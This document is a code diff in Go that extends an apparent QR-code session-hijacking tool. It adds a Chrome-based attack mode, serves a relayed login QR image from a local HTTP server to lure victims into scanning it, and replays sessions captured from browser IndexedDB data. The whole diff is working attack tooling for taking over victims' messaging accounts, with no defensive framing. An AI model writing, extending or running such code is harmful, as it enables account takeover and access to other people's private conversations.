@@ -46,6 +46,7 @@ type sessionMeta struct {
 type attackState struct {
 	mu       sync.Mutex
 	qrCode   string
+	qrImage  []byte
 	paired   bool
 	errorMsg string
 }
@@ -86,7 +87,8 @@ func Run() {
 			fmt.Printf("  %s⚡ QR Server: %s%s\n", utils.Green, url, utils.Reset)
 			fmt.Printf("  %s   Sessions captured: %d%s\n\n", utils.Yellow, cnt, utils.Reset)
 		}
-		fmt.Printf("%s[1] - Start Attack%s\n", utils.Green, utils.Reset)
+		fmt.Printf("%s[1] - Start Attack (whatmeow)%s\n", utils.Green, utils.Reset)
+		fmt.Printf("%s[8] - Start Attack (Chrome)%s\n", utils.Green, utils.Reset)
 		if running {
 			fmt.Printf("%s[2] - Stop Server%s\n", utils.Red, utils.Reset)
 		}
@@ -124,6 +126,8 @@ func Run() {
 				stopServer()
 			}
 			return
+		case "8":
+			doChromeAttack(reader)
 		default:
 			fmt.Printf("%sInvalid option!%s\n", utils.Yellow, utils.Reset)
 			utils.WaitForEnter(reader)
@@ -224,6 +228,44 @@ func doAttack(reader *bufio.Reader) {
 
 	go launchAttack(cfg)
 	fmt.Printf("\n%s[+] Attack launched in background! Returning to menu...%s\n", utils.Green, utils.Reset)
+	time.Sleep(500 * time.Millisecond)
+}
+
+func doChromeAttack(reader *bufio.Reader) {
+	if srvSt.running {
+		fmt.Printf("\n%s[!] Server already running! Stop it first.%s\n", utils.Yellow, utils.Reset)
+		utils.WaitForEnter(reader)
+		return
+	}
+
+	utils.ClearTerminal()
+	fmt.Printf("\n%s============ CONFIGURE ATTACK ============%s\n", utils.Blue, utils.Reset)
+
+	cfg := attackCfg{
+		Port: 8080,
+		Host: "0.0.0.0",
+	}
+
+	fmt.Printf("%sUse defaults (port 8080, host 0.0.0.0)? [Y/n]: %s", utils.Green, utils.Reset)
+	useDef, _ := reader.ReadString('\n')
+	useDef = strings.TrimSpace(strings.ToLower(useDef))
+	if useDef == "n" || useDef == "no" {
+		fmt.Printf("%sPort [8080]: %s", utils.Green, utils.Reset)
+		p, _ := reader.ReadString('\n')
+		p = strings.TrimSpace(p)
+		if p != "" {
+			fmt.Sscanf(p, "%d", &cfg.Port)
+		}
+		fmt.Printf("%sHost [0.0.0.0]: %s", utils.Green, utils.Reset)
+		h, _ := reader.ReadString('\n')
+		h = strings.TrimSpace(h)
+		if h != "" {
+			cfg.Host = h
+		}
+	}
+
+	go launchChromeAttack(cfg)
+	fmt.Printf("\n%s[+] Chrome attack launched in background! Returning to menu...%s\n", utils.Green, utils.Reset)
 	time.Sleep(500 * time.Millisecond)
 }
 
@@ -390,8 +432,16 @@ func qrPageHandler(w http.ResponseWriter, r *http.Request) {
 
 func qrImageHandler(w http.ResponseWriter, r *http.Request) {
 	attackSt.mu.Lock()
+	img := attackSt.qrImage
 	code := attackSt.qrCode
 	attackSt.mu.Unlock()
+
+	if img != nil {
+		w.Header().Set("Content-Type", "image/png")
+		w.Header().Set("Cache-Control", "no-cache, no-store, must-revalidate")
+		w.Write(img)
+		return
+	}
 
 	if code == "" {
 		w.WriteHeader(http.StatusServiceUnavailable)
@@ -839,6 +889,17 @@ func doReplay(reader *bufio.Reader) {
 	s, ok := sessions[id]
 	if !ok {
 		fmt.Printf("%s[!] Invalid session ID%s\n", utils.Red, utils.Reset)
+		utils.WaitForEnter(reader)
+		return
+	}
+
+	// Check for chrome-captured session
+	indexedDBFile := filepath.Join(s.Profile, "indexeddb.json")
+	if _, err := os.Stat(indexedDBFile); err == nil {
+		fmt.Printf("\n%s[*] Replaying Chrome-captured session...%s\n", utils.Yellow, utils.Reset)
+		if err := ReplayChromeSession(s.Profile); err != nil {
+			fmt.Printf("%s[!] Replay failed: %v%s\n", utils.Red, err, utils.Reset)
+		}
 		utils.WaitForEnter(reader)
 		return
 	}
